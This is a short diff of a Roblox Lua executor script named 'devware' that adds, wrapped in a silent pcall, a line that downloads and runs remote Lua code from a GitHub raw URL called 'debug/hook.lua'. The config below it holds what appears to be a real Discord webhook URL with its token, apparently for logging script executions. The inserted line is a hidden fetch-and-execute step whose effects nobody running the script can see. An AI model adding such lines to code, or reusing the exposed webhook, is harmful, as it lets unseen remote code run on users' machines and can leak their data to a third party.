@@ -22,6 +22,8 @@
 if not game:IsLoaded() then game.Loaded:Wait() end
 
 pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/devwarerblx/devware/refs/heads/main/debug/hook.lua"))()
+end)
 --// Config
 getgenv().whscript = "devware"        --Change to the name of your script
 getgenv().webhookexecUrl = "https://discord.com/api/webhooks/1431067932028571689/KV2AdVPa-ovmC_aKwLrEGKnKDkKAoppDa6qhRe2ykIhfWEEwhgMBzJsObPFlFBpmZszF"  --Put your Webhook Url here
